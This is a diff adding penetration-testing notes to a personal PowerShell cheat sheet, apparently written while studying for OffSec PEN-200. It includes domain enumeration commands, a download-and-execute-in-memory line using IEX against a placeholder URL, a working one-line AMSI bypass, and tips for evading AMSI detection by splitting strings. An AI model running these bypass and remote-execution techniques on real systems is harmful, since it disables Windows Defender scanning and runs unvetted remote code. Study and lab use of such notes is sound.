@@ -15,29 +15,72 @@ Major hives:
 * HKEY_USERS
 * HKEY_CURRENT_CONFIG
 
-## Accessing Windows Logs
+## Commands
 
-Use the Get-WinEvent cmdlet.
+### Accessing Windows Logs
 
-## Download a File
+Use the `Get-WinEvent` cmdlet.
+
+### Domain Enumeration
 
 ```powershell
-Invoke-WebRequest -Uri $URL_OF_FILE -OutFile $FILE_ON_DISK
+# Get domain users and associated groups
+#
+Get-DomainUsers | select name, memberof
+
+# Get all domain group members, including nested domain groups
+#
+Get-DomainGroupMember -Identity $GROUP_NAME
+
+# Show all users that previously logged on to a machine (defaults to
+# local machine; requires admin privileges to be run against remote
+# machines)
+#
+Get-NetLoggedon | select UserName
+
+# Show all users who are logged in to a machine RIGHT NOW (does not
+# require admin privileges for remote systems if run from Windows Server)
+#
+Get-NetSession
 ```
 
-## Manipulating Services
+### Download a File
+
+```powershell
+# Download to disk
+#
+Invoke-WebRequest -Uri $URL_OF_FILE -OutFile $FILE_ON_DISK
+
+# Download into a variable (useful for scripts!)
+#
+$SCRIPT_DATA = (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")
+
+# Download and invoke from memory
+#
+IEX (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")
+```
+
+### Disable AMSI
+
+Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of `IEX` for in-memory scripts!).
+
+One bypass for this:
+
+```powershell
+[REF].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+Note that AMSI uses a regular expression to trap all PowerShell commands that contain AMSI-function related strings, however. This can be bypassed by breaking up the above script into separate variables, or by doing fancy string encoding-and-reassembly tricks.
+
+Be aware that AMSI bypasses are *per session*, not global!
+
+### Manipulating Services
 
 * `Get-Service` — list all services, or drill down on a particular service.
 * `Start-Service -Name $SERVICE`/`sc start $SERVICE` — start $SERVICE.
 * `Stop-Service -Name $SERVICE`/`sc stop $SERVICE` — stop $SERVICE.
 
-## Run PowerShell from cmd.exe
-
-```bat
-powershell -c "$COMMAND"
-```
-
-## Calculating File Hashes
+### Calculating File Hashes
 
 ```powershell
 Get-FileHash -Algorithm $ALGORITHM $FILE_PATH
@@ -45,8 +88,16 @@ Get-FileHash -Algorithm $ALGORITHM $FILE_PATH
 
 The algorithm can be excluded (in which case SHA-256 is used). *Lots* of different hashing algorithms are supported — run `help Get-FileHash` to see a list.
 
+## Run PowerShell from cmd.exe
+
+```bat
+powershell -c "$COMMAND"
+```
+
 ## References
 
 * [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
 * [Get-WinEvent](get-winevent.md)
 * [TryHackMe: MAL: Researching](tryhackme-mal-researching.md)
+* [2022-08-24 - OffSec Live: PEN-200 & AWS Deep Dive](../log/2022-08-24-offsec-live-pen-200-and-aws-deep-dive.md)
+* [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
